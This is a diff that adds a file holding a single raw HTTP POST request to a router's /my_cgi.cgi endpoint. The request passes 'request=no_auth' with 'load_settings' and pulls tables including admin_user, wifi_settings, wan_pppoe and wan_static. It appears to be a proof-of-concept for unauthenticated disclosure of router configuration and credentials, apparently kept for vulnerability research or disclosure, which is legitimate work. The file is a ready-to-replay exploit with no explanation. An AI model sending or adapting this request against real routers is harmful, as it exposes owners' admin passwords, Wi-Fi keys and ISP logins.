@@ -1,0 +1,13 @@
+POST /my_cgi.cgi?0.6420256755562417 HTTP/1.1
+Host: 192.168.0.1
+Content-Length: 345
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.60 Safari/537.36
+Content-Type: application/x-www-form-urlencoded
+Accept: */*
+Origin: http://192.168.0.1
+Referer: http://192.168.0.1/Wizard_Default.htm
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+
+request=no_auth&request=load_settings&table_name=mode_version&table_name=get_restore_default&table_name=wan_settings&table_name=admin_user&table_name=wan_dhcp&table_name=wan_static&table_name=wan_pppoe&table_name=wan_pptp&table_name=wan_l2tp&table_name=wifi_settings&table_name=time&table_name=get_device_name&table_name=fw_ver&table_name=hw_ver
